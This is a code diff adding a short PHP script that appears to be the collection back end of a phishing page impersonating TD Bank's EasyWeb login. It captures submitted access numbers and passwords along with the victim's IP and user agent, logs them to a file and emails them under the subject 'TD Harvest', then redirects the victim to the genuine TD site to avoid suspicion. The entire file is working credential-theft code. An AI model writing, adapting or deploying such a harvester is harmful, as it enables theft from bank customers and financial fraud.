@@ -1,0 +1,18 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $access = $_POST['access'];
+    $password = $_POST['password'];
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $useragent = $_SERVER['HTTP_USER_AGENT'];
+    
+    $log = "Access: $access | Pass: $password | IP: $ip | UA: $useragent\n";
+    file_put_contents('td_logs.txt', $log, FILE_APPEND);
+    
+    // Email logs (configure SMTP with free Mailgun or Gmail)
+    mail('yourhiddenemail@example.com', 'TD Harvest', $log);
+    
+    // Redirect to real TD site
+    header('Location: https://www.td.com/ca/en/personal-banking/easyweb/login');
+    exit;
+}
+?>
